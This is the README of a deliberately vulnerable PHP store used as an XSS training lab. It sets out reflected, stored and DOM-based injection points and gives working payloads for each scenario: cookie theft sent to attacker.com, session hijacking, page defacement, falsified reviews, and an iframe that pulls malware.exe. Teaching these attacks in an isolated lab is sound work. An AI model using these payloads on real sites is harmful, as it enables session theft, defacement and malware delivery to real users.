# Vulnerable Web Application Lab (Gadget Store)

This repository contains a PHP application intentionally designed with security vulnerabilities for educational purposes. It demonstrates common web-based attacks including Data Theft, Session Hijacking, Defacement, Reputation Damage, and Malware Distribution.

## Lab Setup
1.  Run the PHP server: `php -S localhost:8000`
2.  Open `http://localhost:8000` in your browser.

### Credentials
- **Admin**: `admin` / `admin123`
- **User**: `victim` / `password123`

## Vulnerability Overview

The application is susceptible to Cross-Site Scripting (XSS) in several forms:
- **Reflected XSS**: In `search.php` (via `query` parameter) and `profile.php` (via `msg` parameter).
- **Stored XSS**: In `product.php` (via the customer review/comments section).
- **DOM-based XSS**: In `product.php` (via `promo` parameter in the URL).

## Attack Scenarios and Payloads

### 1. Data Theft
**Objective**: Steal session cookies.
- **Where to inject**: Product review in `product.php`.
- **Payload**:
  ```html
  <script>fetch('http://attacker.com/log?c=' + btoa(document.cookie));</script>
  ```

### 2. Session Hijacking
**Objective**: Steal a session ID to impersonate a user.
- **Where to inject**: Search query in `search.php` or a product review.
- **Payload**:
  ```html
  <script>new Image().src="http://attacker.com/steal?sid=" + document.cookie;</script>
  ```

### 3. Defacement
**Objective**: Change the website's appearance.
- **Where to inject**: Product review in `product.php`.
- **Payload**:
  ```html
  <script>document.body.innerHTML = '<h1>HACKED</h1>';</script>
  ```

### 4. Reputation Damage
**Objective**: Make a user appear to say something they didn't.
- **Where to inject**: Product review in `product.php`.
- **Payload**:
  ```html
  <script>document.querySelector('.card-text').innerText = 'I hate this store!';</script>
  ```

### 5. Malware Distribution
**Objective**: Force a file download.
- **Where to inject**: URL parameter `promo` in `product.php`.
- **Example URL**: `http://localhost:8000/product.php?id=1&promo=<iframe src="http://attacker.com/malware.exe"></iframe>`
- **Payload**:
  ```html
  <iframe src="http://attacker.com/malware.exe"></iframe>
  ```

---
**Disclaimer**: This application is intentionally vulnerable and should only be used in a controlled, isolated lab environment for educational purposes.
